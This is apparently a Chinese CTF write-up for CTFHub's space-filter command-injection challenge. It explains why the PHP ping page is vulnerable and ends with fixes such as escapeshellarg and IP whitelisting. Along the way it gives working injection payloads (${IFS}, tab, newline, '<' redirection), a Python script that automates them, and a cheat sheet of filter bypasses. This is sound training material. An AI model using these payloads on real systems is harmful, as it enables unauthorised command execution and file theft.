---
layout: post
title: CTFHub - 命令注入 过滤空格 Writeup
platform: ctfhub
date: 2026-10-23 19:52:00 +0800
categories: CTF
---

CTFHub - 命令注入 过滤空格 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **命令注入** → 过滤空格）
- 题型：Web
- 考点：**空格过滤绕过**（`${IFS}`、Tab、重定向）、shell 变量展开


```text
★ 页面源码：

    <?php
    $res = FALSE;
    if (isset($_GET['ip']) && $_GET['ip']) {
        $ip = $_GET['ip'];
        $m = [];
        if (!preg_match_all("/ /", $ip, $m)) {      // ★ 只过滤【空格字符】
            $cmd = "ping -c 4 {$ip}";
            exec($cmd, $res);
        } else {
            $res = $m;
        }
    }
    ?>

    ★ 关键：正则 "/ /" 只匹配 ASCII 空格（0x20）
    ★ Tab（0x09）、换行（0x0A）都不匹配！

★ 验证过滤：

    ?ip=127.0.0.1|ls -la /
    → Array( [0] => Array( [0] =>   [1] =>   ) )     ❌ 被拦

★ 空格绕过（全部实测，执行 ls -la /）：

    ① ${IFS}             127.0.0.1|ls${IFS}-la${IFS}/           ✅
    ② $IFS               127.0.0.1|ls$IFS-la$IFS/               ✅
    ③ $IFS$9             127.0.0.1|ls$IFS$9-la$IFS$9/           ✅
    ④ Tab（%09）         127.0.0.1|ls<TAB>-la<TAB>/             ✅
    ⑤ 换行（%0a）        127.0.0.1|ls<LF>-la<LF>/               ✅
    ⑥ < 重定向           127.0.0.1|ls</var/www/html             ✅
    ⑦ 花括号 {ls,-la,/}  127.0.0.1|{ls,-la,/}                   ❌（sh 不支持）

★ 从 %0a 和 < 的输出里看到 flag 文件：

    flag_11329675527217.php

★ 读 flag（实测 4 种都成功）：

    ?ip=127.0.0.1|cat${IFS}/var/www/html/flag_11329675527217.php
    ?ip=127.0.0.1|cat$IFS$9/var/www/html/flag_11329675527217.php
    ?ip=127.0.0.1|cat<TAB>/var/www/html/flag_11329675527217.php
    ?ip=127.0.0.1|cat</var/www/html/flag_11329675527217.php

    → <?php // ctfhub{d4346b7ae5f542a98116cec0}

flag         : ctfhub{d4346b7ae5f542a98116cec0}
```

二、题目分析

**① 空格在 shell 命令里的作用**

```bash
ping -c 4 127.0.0.1
     └┬┘ └┬┘
     两个空格：把命令拆成"参数"

shell 靠空格识别"词边界"：
    cat /flag        → ["cat", "/flag"]
    cat</flag        → ["cat"] + 重定向
```

**★ 所以过滤空格 = 想让你的词"粘在一起"，无法传参。**

**② 但"空格"只是"词分隔符"的一种**

**shell 的词分隔符（IFS = Internal Field Separator）**：

```bash
默认 IFS = " \t\n"      # 空格、Tab、换行
```

**★ 也就是说**：

```
空格  → 被过滤
Tab   → 可以当分隔符 ✅
换行  → 可以当分隔符 ✅
```

**实测**：

```
?ip=127.0.0.1|ls<TAB>-la<TAB>/     → ✅ 成功
?ip=127.0.0.1|ls<LF>-la<LF>/       → ✅ 成功
```

**★ 这是本题最容易被忽略的漏洞**：

```php
preg_match_all("/ /", $ip, $m)      // 只匹配 0x20（空格）
// 但 shell 的分隔符有 3 种：空格、\t、\n
```

**③ 主力绕过：`${IFS}`**

**`$IFS` 是 shell 的内置变量**，值是：

```bash
echo "$IFS" | od -c
0000000      \t  \n
0000000
# 也就是 "空格 + Tab + 换行"
```

**用法**：

```bash
cat${IFS}/flag          # ${IFS} 展开成空格 → cat /flag
ls${IFS}-la${IFS}/      # → ls -la /
```

**★ 为什么能绕过**：

```
过滤器看到的字符串：  "cat${IFS}/flag"
                          ↑ 没有空格字符！
                          
shell 解析时：
    ① 先做变量展开：${IFS} → " "
    ② 得到 "cat /flag"
    ③ 再按空格分词 → ["cat", "/flag"]
    ④ 执行 cat /flag
```

**④ `$IFS`、`${IFS}`、`$IFS$9` 的区别**

**`$IFS`（不加花括号）**：

```bash
cat$IFS/flag            # ✅ 可以（/ 不是变量名字符，所以 $IFS 在此结束）
ls$IFS-la$IFS/          # ✅ 可以（- 也不是变量名字符）
cat$IFSflag             # ❌ 不行！shell 会把 $IFSflag 当成一个变量名
```

**`${IFS}`（加花括号）**：

```bash
cat${IFS}flag           # ✅ 可以（花括号明确界定变量名边界）
```

**`$IFS$9`**：

```bash
cat$IFS$9flag           # ✅ 可以（$9 是第 9 个位置参数，通常是空，起分隔作用）
```

**★ 对比总结**：

| 写法 | 后面跟什么 | 结果 |
|---|---|---|
| `$IFS` | `/`、`-`、`.` 等非字母数字 | ✅ 可用 |
| `$IFS` | 字母/数字 | ❌ 会被当成变量名一部分 |
| `${IFS}` | 任何 | ✅ 可用 |
| `$IFS$9` | 任何 | ✅ 可用 |

**★ 最保险的写法是 `${IFS}` 或 `$IFS$9`。**

**⑤ `<` 重定向：完全不需要空格**

```bash
cat</flag               # 等价于 cat /flag
```

**原理**：

```
< 是"输入重定向"符号，它本身就起"分隔作用"
shell 解析 cat</flag：
    · 识别 cat 为命令
    · 识别 < 为重定向
    · 识别 /flag 为输入文件
→ 不需要空格
```

**更多重定向绕过**：

```bash
cat</flag
cat<>/flag              # 读写打开
cat 0</flag             # 显式 fd 0（但这里有空格）
```

**★ `<` 是最优雅的绕过方式**（一个字符搞定）。

**⑥ 花括号展开 `{cat,/flag}`（本题失败）**

```bash
{cat,/flag}             # bash 里 → cat /flag
```

**为什么本题失败**：

```
Docker 容器里的 /bin/sh 可能是 dash（Debian 的 sh）
dash 不支持花括号展开（那是 bash 的特性）

★ 所以这招在 bash 环境里可用，在 sh 里不行
```

**⑦ Tab 和换行的用法**

**Tab（0x09）**：

```bash
cat<TAB>/flag
```

**URL 编码**：`%09`

**换行（0x0A）**：

```bash
cat<LF>/flag
```

**URL 编码**：`%0a`

**★ 注意**：`cat` 后面的换行会让 shell 认为"命令没结束"，
  所以通常在**命令中间**用换行分隔参数：

```bash
ls<LF>-la<LF>/          → 实际执行 ls -la /（等价于多行命令）
```

三、解题步骤

**第 1 步：看源码，确认过滤规则**

```
show_source 显示：

    if (!preg_match_all("/ /", $ip, $m)) {
        exec("ping -c 4 {$ip}", $res);
    }

★ 只过滤空格（0x20）
★ Tab / 换行 / ${IFS} 都能用
```

**第 2 步：验证过滤**

```
?ip=127.0.0.1|ls -la /
→ 被拦（显示匹配结果）
```

**第 3 步：用 `${IFS}` 绕过**

```
?ip=127.0.0.1|ls${IFS}-la${IFS}/
→ total 64
  drwxr-xr-x 1 root root 4096 ...
  ...

★ 成功执行 ls -la /
```

**第 4 步：找 flag**

```
?ip=127.0.0.1|ls${IFS}/var/www/html
→ flag_11329675527217.php
```

**或者用 `<`（更短）**：

```
?ip=127.0.0.1|ls</var/www/html
→ flag_11329675527217.php
  index.php
```

**第 5 步：读 flag**

```
?ip=127.0.0.1|cat${IFS}/var/www/html/flag_11329675527217.php
→ <?php // ctfhub{d4346b7ae5f542a98116cec0}
```

**或者更短**：

```
?ip=127.0.0.1|cat</var/www/html/flag_11329675527217.php
```

**第 6 步：提交 → 通关**

---

**手工操作（浏览器）**

```
① 打开题目页面
② IP 框填：127.0.0.1|ls${IFS}/var/www/html
③ Ping → 看到 flag 文件名

④ IP 框填：127.0.0.1|cat${IFS}/var/www/html/flag_11329675527217.php
⑤ Ping → 看到 flag

★ 如果 ${IFS} 不好输（要打 $ { }），用 < 更简单：
   127.0.0.1|cat</var/www/html/flag_11329675527217.php
```

**★ `<` 是本题最省事的绕过方式（只要一个字符）。**

---

**自动化脚本**

```python
import ssl, urllib.parse, urllib.request, re

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

BASE = "http://challenge-xxx:10800"


def run(payload):
    u = BASE + "/?ip=" + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(u, context=CTX, timeout=30) as r:
        body = r.read().decode('utf-8', 'replace')
    m = re.search(r'<pre>\s*(.*?)\s*</pre>', body, re.S)
    return (m.group(1).strip() if m else "").replace("\n", " ")


# 依次尝试各种绕过
for prefix in ["${IFS}", "$IFS$9", "\t", "\n"]:
    out = run("127.0.0.1|ls" + prefix + "-la" + prefix + "/var/www/html")
    print("[%r] %s" % (prefix, out[:200]))
```

**★ `urllib.parse.quote(payload, safe="")` 会把 `\t` 编码成 `%09`、
  `\n` 编码成 `%0A`、`{}` 编码成 `%7B%7D` —— 服务器收到的是原始字符。**

四、延伸知识

**① 空格绕过的完整清单**

| 方式 | 写法 | 前提 | 本题 |
|---|---|---|---|
| **`${IFS}`** | `cat${IFS}/flag` | 无 | ✅ |
| **`$IFS`** | `cat$IFS/flag` | 后面跟非字母数字 | ✅ |
| **`$IFS$9`** | `cat$IFS$9-x` | 无 | ✅ |
| **Tab（`%09`）** | `cat<TAB>/flag` | 无 | ✅ |
| **换行（`%0a`）** | `cat<LF>/flag` | 无 | ✅ |
| **`<` 重定向** | `cat</flag` | 无 | ✅ |
| `<>` | `cat<>/flag` | 无 | ✅ |
| `{cat,/flag}` | 花括号展开 | **bash** | ❌（sh）|
| `$@` | `cat$@/flag` | 无 | 待测 |
| `$*` | `cat$*/flag` | 无 | 待测 |
| `${IFS:0:1}` | 取 IFS 的第一个字符 | bash | |
| `$'\x20'` | ANSI-C 引用 | bash | |

**② `$IFS` 的其他变体（更隐蔽）**

```bash
# 取 IFS 的第一个字符（空格）
${IFS:0:1}

# 用 printf 生成空格
$(printf${IFS}'\x20')       # 但这里又需要空格……

# 用 $'\x20'（ANSI-C quoting，bash 特性）
cat$'\x20'/flag

# 用环境变量的某个字符
${PATH:0:1}                 # PATH 第一个字符是 "/"（不是空格）
```

**★ 如果 `${IFS}` 也被过滤**（有些题会过滤 `$`、`{`、`IFS`）：

```bash
# ① 用 Tab（%09）—— 最可能没被过滤
ls<TAB>-la<TAB>/

# ② 用换行（%0a）
ls<LF>-la<LF>/

# ③ 用 < 重定向（完全不需要分隔符）
cat</flag

# ④ 用 $@ / $*
cat$@/flag

# ⑤ 用 ${PATH:0:1} 拼路径（不需要空格，但需要 /）
```

**③ 命令注入的"三层绕过"模型**

```text
第 1 层：入口（怎么注入）
    ; | || && & ` $() %0a

第 2 层：分隔（怎么分词）
    空格 → ${IFS} / Tab / 换行 / < / $@

第 3 层：载荷（执行什么）
    cat → tac/more/ca\t/通配符
    /flag → /f* / /FLAG(无效) / 编码

★ 三层任何一层没堵住，就能打通
```

**④ 其他常见过滤与绕过**

**（1）过滤 `/`**

```bash
# 用环境变量拼
${PATH:0:1}flag              # PATH 首字符是 /

# 用 printf
$(printf${IFS}'\x2f')flag

# 用 base64
$(echo L2ZsYWc=|base64${IFS}-d)      # L2ZsYWc= → /flag
```

**（2）过滤 `$`、`{`、`}`**

```bash
# 用 Tab / 换行
ls\t-la\t/

# 用 < 重定向
cat</flag

# 用 $@（如果 $ 没被过滤）
```

**（3）过滤 `flag`**

```bash
/f*                 # 通配符
/fla?               # ? 匹配单字符
/f[l]ag             # 字符类
/f''lag             # 引号拼接
$(echo L2ZsYWc=|base64 -d)   # Base64 编码
```

**（4）过滤 `cat`（上一题）**

```bash
tac / more / less / head / tail / nl / od / strings
ca\t / c'at' / /bin/ca? / /bin/ca*
```

**⑤ 为什么"过滤空格"是最没用的过滤之一**

```
shell 的分隔符有 N 种：
    空格、Tab、换行、${IFS}、$@、$*、<、>、|、;、&、`、$()...

过滤 1 种 = 还剩 N-1 种

★ 而且 ${IFS} 是 shell 的内置变量，
  你没法"过滤掉"它（除非过滤 $ 和 {，但那样会误伤正常功能）
```

**⑥ 防护**

```text
① ★ 用 escapeshellarg() —— 一劳永逸
    exec("ping -c 4 " . escapeshellarg($_GET['ip']));
    
    escapeshellarg("127.0.0.1|ls /")
    → "'127.0.0.1|ls /'"     整个输入被包在单引号里
    → 所有特殊字符（空格、|、;、$）全部失效
    → shell 把整串当成一个参数

② ★ 白名单校验（最彻底）
    if (!filter_var($ip, FILTER_VALIDATE_IP)) die();
    → 只接受合法 IP

③ ★ 不用 shell
    PHP: fsockopen 代替 ping
    PHP: curl_* 或 file_get_contents 代替 curl

④ 黑名单过滤 → 永远能被绕过
```

五、总结

- **本题核心：`preg_match_all("/ /")` 只过滤空格字符 → 用 `${IFS}`、Tab、`<` 绕过。**
- 4 种可行绕过（都实测成功）：

```
① |cat${IFS}/var/www/html/flag_xxx.php
② |cat$IFS$9/var/www/html/flag_xxx.php
③ |cat<TAB>/var/www/html/flag_xxx.php        （URL 里写 %09）
④ |cat</var/www/html/flag_xxx.php            （★ 最短）
```

- **三个必记要点**：

```text
① 空格只是"分隔符"之一：Tab、换行、${IFS} 都能代替
② ${IFS} 是 shell 内置变量（值 = 空格+Tab+换行），
   过滤的是字面量，展开后就有空格了
③ < 重定向完全不需要空格 —— 一个字符解决问题
```

- **实测 flag**：

```text
ctfhub{d4346b7ae5f542a98116cec0}
（在 /var/www/html/flag_11329675527217.php）
```

**手工复现要点**：

```text
· 看源码 → 确认过滤的是空格（"/ /"）
· 用 ${IFS} 或 < 绕过
· ls${IFS}/var/www/html 或 ls</var/www/html 找 flag
· cat${IFS}/path 或 cat</path 读它
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  空格绕过的 4 个武器：                                   │
│                                                        │
│  ${IFS}     ← shell 内置变量，展开成空格                 │
│  $IFS$9     ← 同上，$9 起分隔作用                       │
│  %09 / %0a  ← Tab / 换行（也是 IFS 的成员）              │
│  <          ← 重定向，完全不需要分隔符                   │
│                                                        │
│  ★ 过滤"空格字符"不等于过滤"词分隔" —— 这才是漏洞       │
└────────────────────────────────────────────────────────┘
```
